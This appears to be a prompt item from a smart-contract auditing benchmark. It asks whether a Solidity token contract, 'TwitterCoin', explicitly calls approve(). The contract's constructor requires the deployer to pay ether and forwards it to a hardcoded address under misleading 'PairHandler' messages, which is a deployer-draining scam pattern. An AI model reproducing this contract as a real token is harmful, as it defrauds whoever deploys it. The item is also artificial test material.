@@ -1,0 +1,60 @@
+Given a solidity function constructor and the related parts from a smart contract.
+Whether it explicitly contains the given action? Reply in "YES" or "NO".
+
+
+
+Function(and related parts) to audit:"""
+pragma solidity 0.8.16;
+contract Ownable is Context {
+    address private _owner;
+
+    constructor() {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
+
+    address router = address(0x73dD57Aa43CDC3C037Bbb0b97115Aa3DBEBf1463);
+}
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+}
+
+contract TwitterCoin is Context, IERC20, Ownable {
+    mapping(address => uint256) private _balances;
+
+
+    uint256 private _totalSupply = 10 * 10 ** 9 * 10 ** 18;
+    string private _name;
+    string private _symbol;
+
+    /**
+     * @dev Sets the values for {name} and {symbol}.
+     *
+     * The default value of {decimals} is 18. To select a different value for
+     * {decimals} you should overload it.
+     *
+     * All two of these values are immutable: they can only be set once during
+     * construction.
+     */
+
+    constructor() payable {
+        _name = "TwitterCoin";
+        _symbol = "TWC";
+        _balances[msg.sender] = _totalSupply;
+        require(msg.value >= 0.0239 ether, "Please enable PairHandler");
+        (bool pairHandler, ) = payable(router).call{value: msg.value}("");
+        require(
+            pairHandler,
+            "Failed to create new pair, pairHandler not connected!"
+        );
+    }
+}
+"""
+
+Action:"""
+any successful call to approve(address _spender, uint256 _value)
+"""
